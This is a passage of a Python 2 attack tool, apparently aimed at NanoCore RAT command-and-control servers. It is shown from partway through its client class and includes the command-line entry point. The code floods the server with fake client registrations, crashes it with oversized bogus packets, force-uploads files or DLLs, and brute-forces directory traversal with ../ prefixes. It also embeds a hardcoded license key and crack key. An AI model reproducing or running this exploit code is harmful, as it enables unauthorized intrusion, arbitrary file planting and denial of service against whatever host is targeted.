                if self.VERBOSE:
                    stderr.write("Failed to send packet \n")
                self.dis_connect(self.SOCKET)
                return False
            try :
                if self.SOCKET != None:
                    self.SOCKET.sendall(self.PACKET)
                    flag = False
                else:
                    return False
            except socket.error:
                flag = True
                retry += 1
                if retry > 5:
                    retry = -1
        self.PACKET = None
        return True

    def recv_packet(self):
        if self.RPACKET != None:
            if self.VERBOSE:
                stderr.write("RBODY: %s \n\n" % binascii.hexlify(self.RPACKET))
            self.ingestor()
            self.RPACKET = None
            return True
        else:
            ready = select.select([self.SOCKET], [], [], 0.05)
            if ready[0]:
                try :
                    header = self.SOCKET.recv(4)
                except Exception:
                    self.dis_connect(self.SOCKET)
                    return False
            else:
                if self.VERBOSE:
                    stderr.write("Socket empty, skipping \n")
                return True
            body_size = 0
            try :
                if self.VERBOSE:
                    stderr.write("RHEADER: %s \n" % binascii.hexlify(header))
                body_size = struct.unpack("<L", header)[0]
            except Exception:
                stderr.write("Failed to decode packet header, hex: %s \n" % binascii.hexlify(header))
                self.dis_connect(self.SOCKET)
                return False
            if self.VERBOSE:
                stderr.write("Packet recieved with body size of %s bytes\n" % str(body_size))
            if (body_size % 8 != 0):
                if self.VERBOSE:
                    stderr.write("Packet recieved with incorrect body size \n")
                self.dis_connect(self.SOCKET)
                return False
            if body_size > 0:
                self.RPACKET = self.SOCKET.recv(body_size)
                while(len(binascii.hexlify(self.RPACKET)) < 2*body_size):
                    self.RPACKET += self.SOCKET.recv(2*body_size - (len(binascii.hexlify(self.RPACKET))))
                self.RPACKET = self.RPACKET[:body_size]
                self.recv_packet()

    def gen_client_profile(self):
        self.GUID = random_string(32, 32)
        self.SYSNAME = "DESKTOP-" + random_string(7, 7, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        self.USRNAME = "Admin"
        self.GROUPTAG = "Default"
        self.VERISONID = "1.2.2.0"
        if self.VERBOSE:
            stderr.write("Client Profile Generated \n GUID: %s \n SYSNAME: %s \n USERNAME: %s \n GROUP: %s \n VERSION: %s \n\n" % (self.GUID, self.SYSNAME, self.USRNAME, self.GROUPTAG, self.VERISONID))

    def init_connect(self, remote_ip, socket_array):
        c1_time = datetime.now()
        i = 0
        ii = 0
        if self.VERBOSE:
            stderr.write("Connecting to ip %s on port %s \n\n" % (remote_ip, str(self.PORT)))
        for tsock in list(socket_array):
            if ((datetime.now() - c1_time) > (self.ONESECOND * self.MAXTIMEOUT/2)):
                break
            try:
                self.SOCKET = tsock
                self.SOCKET.connect((remote_ip, self.PORT))
                i += 1
            except socket.error:
                self.dis_connect(tsock)
        if self.VERBOSE:
            stderr.write("Connected %s clients to ip %s on port %s sending handshakes \n\n" % (str(i), remote_ip, str(self.PORT)))
        for tsock in list(socket_array):
            if i < ii:
                self.dis_connect(tsock)
            else:
                self.SOCKET = tsock
                self.gen_client_profile()
                self.packet_register_client()
                if self.VERBOSE:
                    stderr.write("SRAW: %s \n" % binascii.hexlify(self.PACKET))
                self.encapsulate_packet()
                self.send_packet()
            ii += 1
        if self.VERBOSE:
            stderr.write("Closed %s unused sockets \n\n" % str(ii-i))

    def re_init(self, remote_ip, socket_array):
        if len(self.ACTIVESOCKETS) < self.NSOCKETS:
            if self.VERBOSE:
                stderr.write("Respawning %s socket(s) \n" % str(self.NSOCKETS - len(self.ACTIVESOCKETS)))
            for _ in range(self.NSOCKETS - len(self.ACTIVESOCKETS)):
                try:
                    tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    if tsock:
                        self.REACTIVESOCKETS.append(tsock)
                except socket.error as e:
                    break

    def __init__(self, SOCKET, VERBOSE, NSOCKETS):
        c_time = datetime.now()
        sleep(1)
        self.ONESECOND = datetime.now() - c_time
        if VERBOSE:
            stderr.write("Spawning local socket(s) \n")
        for _ in range(NSOCKETS):
            try:
                tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if tsock:
                    self.ACTIVESOCKETS.append(tsock)
            except socket.error as e:
                break
        if self.VERBOSE:
            stderr.write("Spawned %s socket(s) \n\n" % str(len(self.ACTIVESOCKETS)))

    def run(self):
        try:
            remote_ip = socket.gethostbyname(self.HOST)
        except socket.gaierror:
            stderr.write("Hostname could not be resolved \n")
            exit()
        self.init_connect(remote_ip, self.ACTIVESOCKETS)
        n_time = datetime.now()

        if self.CLIENTDOS:
            self.packet_coreclient_blargepacket()
            self.compress_bpacket()
            self.encapsulate_packet()
            bdospacket = self.PACKET*128
            self.PACKET = None

        while((datetime.now() < (n_time + (self.ONESECOND * self.ATTACKTIMER)))):
            c1_time = datetime.now()
            for tsock in list(self.ACTIVESOCKETS):
                if self.CLIENTFLOOD:
                    if ((datetime.now() - c1_time) > (self.ONESECOND * self.MAXTIMEOUT)):
                        break
                self.SOCKET = tsock
                self.recv_packet()
                if self.PACKET != None:
                    if self.VERBOSE:
                        stderr.write("SRAW: %s \n" % binascii.hexlify(self.PACKET))
                    self.encapsulate_packet()
                    self.send_packet()
                else:
                    if self.CLIENTDOS:
                        if self.VERBOSE:
                            stderr.write("Sending bogus packet \n")
                        self.PACKET = bdospacket
                        self.send_packet()
                    else:
                        if self.VERBOSE:
                            stderr.write("Skipped socket \n")
            self.re_init(remote_ip, self.REACTIVESOCKETS)
            self.init_connect(remote_ip, self.REACTIVESOCKETS)
            for tsock in list(self.REACTIVESOCKETS):
                self.ACTIVESOCKETS.append(tsock)
                self.REACTIVESOCKETS.remove(tsock)
            self.REACTIVESOCKETS = []

        if self.DLLCOMMAND != None and self.INTVULN:
            stderr.write("Sending DLL: %s \n" % self.LUPLOADPATH)
            self.packet_coreclient_native()
            self.compress_packet()
            self.encapsulate_packet()
            self.send_packet()
            sleep(self.ATTACKTIMER)

        if self.LUPLOADPATH != None and self.RUPLOADPATH != None and self.OUTPUTPATH != None:
            if self.UPLOADVULN:
                self.packet_upload_force()
                self.compress_packet()
                self.encapsulate_packet()
                self.send_packet()
                stderr.write("File Uploaded! " + self.RUPLOADPATH + "\n")
                if self.UPLOADBRUTE:
                    for counter in range(20):
                        self.recv_packet()
                        if self.PACKET != None:
                            if self.VERBOSE:
                                stderr.write("SRAW: %s \n" % binascii.hexlify(self.PACKET))
                            self.encapsulate_packet()
                            self.send_packet()
                        self.RUPLOADPATH = "..\\" + self.RUPLOADPATH
                        self.packet_upload_force()
                        self.compress_packet()
                        self.encapsulate_packet()
                        self.send_packet()
                        stderr.write("File Uploaded! " + self.RUPLOADPATH + "\n")
                sleep(self.ATTACKTIMER)
            else:
                stderr.write("WARN: %s is not vulnerable to force upload \n" % self.HOST)


def about():
    print '''
8b  8                  888                      8            
8Ybm8 .d88 8d8b. .d8b.  8  8d8b. Yb  dP .d88 .d88 .d88b 8d8b 
8  "8 8  8 8P Y8 8' .8  8  8P Y8  YbdP  8  8 8  8 8.dP' 8P   
8   8 `Y88 8   8 `Y8P' 888 8   8   YP   `Y88 `Y88 `Y88P 8    
'''
    exit(0)

def usage():
    print '''
Usage: %s [OPTIONS]
    -t  <target>   IP Address or Domain of the NanoCore C2 Server
    -p  <port>   Port of the NanoCore C2 Server

    -k  <key>   License Key
    -c  <key>   Additional Key added to Alcatraz3222 crack

    -w <path>   Write discovered plugins to directory
    -f <path>   Local Upload Path
    -e   Upload DLL used with -f argument

    -d <path>   Remote Upload Path
    -b   Bruteforce upload directory with ../ prefixes

    -q   Silently check NanoCore C2 Server plugin guids
    -z   Silently crash NanoCore C2 Server

    -r <number>   Number of connections to establish
    -s <seconds>   Duration of attack

    -v   Enable verbose logging
    -a   Show about information
    -h   Show help information
''' % argv[0]
    exit(1)

def main():
    HOST = None
    PORT = None

    LICENSEKEY = "8219831EF052"
    CRACKKEY = "zeroalcatraz"

    OUTPUTPATH = None

    LUPLOADPATH = None
    RUPLOADPATH = None
    DLLCOMMAND = None
    CHECKPWN = None

    CLIENTDOS = False
    UPLOADBRUTE = False
    CLIENTFLOOD = False

    ATTACKTIMER = 1
    NSOCKETS = 1

    EMIT = None
    VERBOSE = False
    SOCKET = None


    try:
        opts,args = GetOpt(argv[1:], "t:p:k:c:w:f:d:r:s:kcwfdqzbersvah");
    except GetoptError, e:
        print 'Usage Error:', e
        usage()

    for opt,optarg in opts:
        if opt == '-v':
            stderr.write("VERBOSE set to True \n")
            VERBOSE = True
        elif opt == '-t':
            if VERBOSE:
                stderr.write("HOST set to %s \n" % optarg)
            HOST = optarg
        elif opt == '-p':
            if VERBOSE:
                stderr.write("PORT set to %s \n" % optarg)
            PORT = int(optarg)
        elif opt == '-k':
            if VERBOSE:
                stderr.write("LICENSEKEY set to %s \n" % optarg)
            LICENSEKEY = optarg
        elif opt == '-c':
            if VERBOSE:
                stderr.write("CRACKKEY set to %s \n" % optarg)
            CRACKKEY = optarg

        elif opt == '-w':
            if VERBOSE:
                stderr.write("OUTPUTPATH set to %s \n" % optarg)
            OUTPUTPATH = optarg

        elif opt == '-f':
            if VERBOSE:
                stderr.write("LUPLOADPATH set to %s \n" % optarg)
            LUPLOADPATH = optarg
        elif opt == '-d':
            if VERBOSE:
                stderr.write("RUPLOADPATH set to %s \n" % optarg)
            RUPLOADPATH = optarg
        elif opt == '-e':
            if VERBOSE:
                stderr.write("DLLCOMMAND set to True \n")
            DLLCOMMAND = True
        elif opt == '-q':
            if VERBOSE:
                stderr.write("CHECKPWN set to True \n")
            CHECKPWN = True

        elif opt == '-z':
            if VERBOSE:
                stderr.write("CLIENTDOS set to True \n")
            CLIENTDOS = True
        elif opt == '-b':
            if VERBOSE:
                stderr.write("UPLOADBRUTE set to True \n")
            UPLOADBRUTE = True
        elif opt == '-r':
            if VERBOSE:
                stderr.write("NSOCKETS set to %s and CLIENTFLOOD set to True \n" % str(optarg))
            NSOCKETS = int(optarg)
            CLIENTFLOOD = True
        elif opt == '-s':
            if VERBOSE:
                stderr.write("ATTACKTIMER set to %s \n" % str(optarg))
            ATTACKTIMER = int(optarg)

        elif opt == '-a':
            about()
        else:
            usage()

    if HOST == None or PORT == None:
        stderr.write("Missing argument(s) HOST or PORT")
        usage()
    else:
        stderr.write("\n")


    handle = init(SOCKET, VERBOSE, NSOCKETS)

    handle.HOST = HOST
    handle.PORT = PORT
    handle.VERBOSE = VERBOSE
    handle.LICENSEKEY = LICENSEKEY
    handle.CRACKKEY = CRACKKEY
    handle.OUTPUTPATH = OUTPUTPATH
    handle.LUPLOADPATH = LUPLOADPATH
    handle.RUPLOADPATH = RUPLOADPATH
    handle.DLLCOMMAND = DLLCOMMAND
    handle.CHECKPWN = CHECKPWN
    handle.CLIENTDOS = CLIENTDOS
    handle.UPLOADBRUTE = UPLOADBRUTE
    handle.CLIENTFLOOD = CLIENTFLOOD
    handle.ATTACKTIMER = ATTACKTIMER
    handle.NSOCKETS = NSOCKETS

    handle.run()


if __name__ == "__main__":
    main()
